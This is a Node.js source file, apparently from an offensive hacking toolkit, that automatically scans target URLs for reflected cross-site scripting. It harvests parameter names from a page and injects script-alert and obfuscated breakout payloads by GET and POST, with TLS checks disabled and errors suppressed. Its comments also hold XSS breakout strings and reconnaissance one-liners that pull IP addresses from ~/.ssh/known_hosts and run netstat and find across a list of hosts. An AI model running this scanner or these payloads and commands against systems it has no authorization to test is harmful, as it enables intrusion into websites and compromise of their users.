var EventEmitter = require('events').EventEmitter,
	fs = require('fs'),
	request = require('request'),
	program = require('commander'),
	maxSockets = 333,
	mylen = 180,
	timeout = 10000,
	n_maxLs = maxSockets;

EventEmitter.prototype._maxListeners = n_maxLs;
var _fnNull = function(e){if(program && program.verbose)console.log(e)};
process.on('uncaughtException', _fnNull);
process.on('unhandledRejection', _fnNull);

EventEmitter.defaultMaxListeners = n_maxLs;
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
/**
 *  cat All_netstat.txt|grep -E "[0-9]{3}\."|grep -vE "(127|\(|LISTEN)"|grep -Ev '192.*?192'|grep -v '223'
 * cat ~/.ssh/known_hosts |grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u
 * node tools/doCmdIps.js -f data/Ok1.txt -c 'netstat -ant'
 * node tools/doCmdIps.js -f data/Ok1.txt -c 'find . -name "*.war"|grep -Ev "(bea|uudi|wls|wsat|weblogic)"'
 * make xss whitelist
 * cd /mysvn/js_tutorial
 * wgetall http://www.runoob.com/js/js-tutorial.html
 * wgetall http://www.runoob.com/ruby/ruby-tutorial.html
 * wgetall https://www.w3cschool.cn/javascript/
 * wgetall http://www.w3school.com.cn/js/index.asp
 * find . -type f|xargs -I % grep -Eo "\b[a-z]+\b" %|sort -u >>/myhktools/tools/xss_whitelist.txt
 * sort -i -u /myhktools/tools/xss_whitelist.txt
 * cd /myhktools;git add /myhktools/tools/xss_whitelist.txt;git commit -m "add xss_whitelist" .;git push
 */
program.version("parse webshell urls 1.0")
			
			.option('-u, --url [value]', 'url')
			.option('-l, --len [value]', 'default 180')
			.option('-s, --skip [value]', 'default true,skip data/xssUrls.txt')
			.option('-v, --verbose', 'show logs')
			.on('--help',function()
			{
				console.log("\n\ncat /mysvn/new_url_list.txt|xargs -I % node tools/checkXss.js -v -u %\n\n");
				console.log("\n\nnode tools/checkXss.js -v -u http://xxx.xxx\n\n");
			})
            .parse(process.argv);
mylen = program.len || mylen;
var g_bSkip = "true" == program.skip;
// 获取一个包装后的请求对象，包含设置代理后的
	// 优先使用系统环境变量中的代理，如果设置了，则覆盖系统代理
function fnGetRequest(req,opt)
{
	var _req = req, s = program && program.proxy || process.env["HTTP_PROXY"] || '',option = 
		{
			agent: false, pool: {maxSockets: 200},
			'timeout':timeout||2000,
			'maxSockets':n_maxLs,
			maxRedirects:10,
			agentOptions: {
				rejectUnauthorized: false
			},
			// localAddress:'192.168.24.1',// 指定网卡Local interface to bind for network connections when issuing the request
			rejectUnauthorized:false,
			removeRefererHeader:false,
			followRedirect:true,     // follow HTTP 3xx responses as redirects (default: true).
			followAllRedirects:true,// follow non-GET HTTP 3xx responses as redirects (default: false)
			'headers':{'connection':'close'}
		};
	if(opt)
	{
		for(var k in opt)option[k] = opt[k];
	}
	// process.env["HTTP_PROXY"] = "http://127.0.0.1:8880";
	if(s)option['proxy'] = s,log("当前代理：" + s);
	
	_req = req.defaults(option);
	
	return _req;
};
/*
"}</script><script>alert(2)</script><script>if(1){//
"}alert(2);if(1){//
");}alert(1);{//
*/
var _s = 0,_t = 0;
function setT(s,t)
{
	_s = s;
	_t = t;
}

var xss_wt = fs.readFileSync("tools/xss_whitelist.txt").toString("utf-8"),
	xss_Oks = g_bSkip?fs.readFileSync("data/xssUrls.txt").toString("utf-8") :"";
function fnDoReq(req,opt,fnCbk)
{
	var o = {
		method: opt.body ? 'POST':'GET',
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110"
	};
	if(opt.body)o["content-type"] = "application/x-www-form-urlencoded";
	for(var k in opt)
	{
		o[k] = opt[k];
	}
	
	var xxUrl = o.uri;delete o.uri;
	req(xxUrl,o,function(e,r,b)
	{
		if(_s && _t && _t.fnDoForm)
		{
			_t.fnDoForm(b,xxUrl,r,'xss');
		}
		// 非html也会，所以取消检测： && -1 < r.headers['content-type'].indexOf("text/html")
		if(!e && b)
		{
			fnCbk(String(b),r.headers);
		}
	});
}

function fnInfo(url,ss,i)
{
	fs.appendFileSync("data/xssUrls.txt", url + "\n");
	console.log("found XSS: " + url);
	if(program && program.verbose)
	{
		console.log(ss.substr(i - mylen, mylen * 1.5))
	}
}

function setInfoCbk(fn)
{
	fnInfo = fn;
}

var g_ScrIpt = "script";
function fnDoCheckUrl(szUrl,fnCbk1)
{
	szUrl = szUrl.trim().replace(/[\s\r\n]*/gmi,'');
	if(g_bSkip && xss_Oks && -1 < xss_Oks.indexOf(szUrl))return;
	// http://1.1.1.1
	// szUrl = szUrl.substr(0,14) + szUrl.substr(14).replace(/[^\/\.]+\?.*?$/gmi,'');
	var url = szUrl,szOurl = url, req = fnGetRequest(request),  
	// new payload 
		s =  "<" + g_ScrIpt + ">alert(" + new Date().getTime() + ")</" + g_ScrIpt + ">";
	// 寻找注入点
	fnDoReq(req,{uri:szOurl,
		},function(b3)
		{
			if(b3)
			{
				var  b3 = String(b3), re1 = new RegExp("(\\b"+ xss_wt.trim().replace(/[^a-z\n]/gmi,'').replace(/\n{1,}/gmi,'\n').replace(/\n/gmi, "\\b)|(\\b") +"\\b)","gmi");
				b3 = b3.replace(re1,'');
				if(b3)
				{
					var re = /(\b[a-z]+\b)/gmi,aP = [],oG={};
					while(ss = re.exec(b3))
					{
						if(!oG[ss[1]])
							oG[ss[1]]=1,aP.push(ss[1]);
					}
					// 这些都需要进行XSS的测试
					if(0 < aP.length)
					{
						aP.push("")
						// encodeURIComponent
						myXss = aP.join("=" + (s) + "&");
						// console.log(myXss);
						fnDoReq(req,{uri:szOurl,body:myXss},function(b1)
						{
							var i = 0;
							if(-1 < (i = b1.indexOf(s)))
							{
								fnInfo(szOurl,b1,i);
							}
						});
					}
				}
			}
		});
	
	if(/\/[^\/\.]+$/gmi.test(url))
		url += "/";

	var aH = /((?:http|https):\/\/([^\.\/]+\.){3,}([^\.\/]+)*)/gmi.exec(url);
	if(aH)
	{
		aH = aH[1];
		url = url.substr(aH.length);
	}
	else aH = "";
	// console.log([aH,url])
	if(url)
		url = url.replace(/\/[^\/]*$/gmi, "/");
	// encodeURIComponent
	// s = 'null"}alert(1);if(1){//';
	/*
	top[8680439..toString`30`]`7`;
	*/
	s = `\`<>"'%()&+\\`;//'"}alert`12`;if(1){//';// new Function`al\ert\`6\``
	var sxPay = encodeURIComponent(s);//("null\";</" + g_ScrIpt + ">" + s);
	var hst = require('url').parse(url);
	// console.log(hst)
	url = aH + url + hst.pathname + "?samelogin=" + sxPay + "&style=" + sxPay;
	// console.log(url)
	fnDoReq(req,{uri:url},function(b,headers)
	{
		if(b)
		{
			var ss = String(b), i = 0;
			if(-1 < (i = ss.indexOf(s)))
			{
				fnInfo(szOurl,ss,i);
			}
			else if(headers)fnCbk1(headers);
		}
	});
}

if(program.url && !program.struts2)
{
	fnDoCheckUrl(program.url,function(h)
	{
		if(h['location'])
		{
			console.log("location: " + h['location']);
			fnDoCheckUrl(h['location']);
		}
	})	
}


module.exports=
{
	fnDoCheckUrl:fnDoCheckUrl,
	setInfoCbk:setInfoCbk,
	setT:setT
};